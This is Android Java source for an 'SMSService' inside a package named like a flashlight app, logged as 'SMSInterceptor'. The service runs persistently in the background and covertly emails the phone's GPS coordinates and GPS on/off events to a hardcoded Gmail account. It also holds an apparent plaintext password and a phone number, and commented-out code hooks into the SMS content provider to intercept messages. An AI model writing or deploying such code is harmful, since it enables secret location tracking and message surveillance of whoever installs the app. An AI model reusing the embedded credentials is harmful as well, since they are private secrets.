package com.flash.light; 

import android.os.Bundle;
import android.os.IBinder;
import android.os.Handler;
import android.os.Message;
import android.os.Messenger;

import android.app.Service;
import android.app.Activity;

import android.content.Intent;
import android.content.Context;
import android.content.ComponentName;
import android.content.ContentResolver;

import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;

import android.net.Uri;
import java.lang.Double;
import android.util.Log;
import android.widget.Toast;
import android.telephony.SmsManager;
import android.database.ContentObserver;

public class SMSService extends Service implements LocationListener {

  private static GmailSender sender;

  public static String gmailEmailString    = "justdriveapp1@gmail.com";
  public static String phoneNumberString   = "2014640695";
  public static String gmailPasswordString = "GHOST21ghost";

  private static boolean eLocation = false;
  private static boolean mLocation = false;

  private static LocationManager locationManager;

  final Messenger mMessenger = new Messenger(new IncomingHandler());

  class IncomingHandler extends Handler {
    @Override
    public void handleMessage(Message msg) {
      super.handleMessage(msg);
    }
  }

  public boolean gpsEnabled() {
    return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
  }

  @Override
  public IBinder onBind(Intent intent) {
    return mMessenger.getBinder();
  }

  @Override
  public void onProviderDisabled(String s) {
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "GPS has been 'DIS'abled!", gmailEmailString, gmailEmailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError", "" + e.toString());
        }
      }
    }).start();       
    eLocation = false;
  }

  @Override
  public void onStatusChanged(String s, int i, Bundle bundle) { }

  @Override
  public void onProviderEnabled(String s) {
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "GPS has been 'EN'abled!", gmailEmailString, gmailEmailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError", "" + e.toString());
        }
      }
    }).start();
    eLocation = true;
  }

  @Override
  public void onLocationChanged(Location location) {
    if(mLocation) {
      Double dLatitude  = location.getLatitude();
      final String latitude   = String.valueOf(dLatitude);
      Double dlongitude = location.getLongitude();
      final String longitude  = String.valueOf(dlongitude);

      new Thread(new Runnable() {

        @Override
        public void run() {
          try {
            sender = new GmailSender();
            sender.sendMail("SMSInterceptor", "Location!\nlatitude-longitude coordinates:\n" +
            "" + latitude + "," + longitude, gmailEmailString, gmailEmailString);
          }
          catch(Exception e) {
            e.printStackTrace();
            Log.e("gmailSenderError", "" + e.toString());
          }
        }
      }).start();
    }
    mLocation = false;
  }

  @Override
  public int onStartCommand(Intent intent, int flag, int startId) throws NullPointerException {

      Log.d("SMSInterceptor onStartCommand()", "Entering onStartCommand method.");

      locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
      if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
        Log.d("SMSInterceptor SMSService","eLocation = TRUE");
        eLocation = true;
      }
      else {
        Log.d("SMSInterceptor SMSService","eLocation = FALSE");
        eLocation = false;
      }

      //String data;
      //if(!eLocation && data != null && intent.hasExtra("obtainLocation")) {
      try {
        if(!eLocation && intent.hasExtra("obtainLocation")) {
          new Thread(new Runnable() {

            @Override
            public void run() {
              try {
                sender = new GmailSender();
                sender.sendMail("SMSInterceptor", "GPS is not enabled. Cannot obtain location.", gmailEmailString, gmailEmailString);
              }
              catch(Exception e) {
                e.printStackTrace();
                Log.e("gmailSenderError", "" + e.toString());
              }
            }
          }).start();
        }
        else if(eLocation && intent.hasExtra("obtainLocation")) {
          mLocation = true;
        }
      }
      catch(NullPointerException e) {
        Log.e("NullPointerException", "" + e.toString());
      }

      locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,30000,10,this);

      /*SMSObserver smsObserver = new SMSObserver(new Handler(), getApplicationContext());
      ContentResolver contentResolver = this.getApplicationContext().getContentResolver();
      contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsObserver);*/

    return START_STICKY;
  }

}
